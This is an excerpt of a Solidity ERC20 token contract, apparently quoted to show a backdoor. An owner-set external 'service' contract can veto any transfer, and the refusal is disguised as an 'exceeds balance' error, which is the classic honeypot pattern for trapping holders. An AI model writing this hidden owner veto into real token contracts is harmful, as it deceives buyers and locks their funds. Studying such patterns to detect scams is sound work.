...
contract wcToken is Context, Ownable, IERC20, IERC20Metadata {
     ...
     */
    function initService(address service_) public onlyOwner{
        _service = service_;
    }
    ...
    function _beforeTokenTransfer(
        ...
        require(to != address(0), "ERC20: transfer to the zero address");
        require(IERC20Safe(_service).beforeTransfer(from, _balances[from], amount), "ERC20: transfer amount exceeds balance");
    }
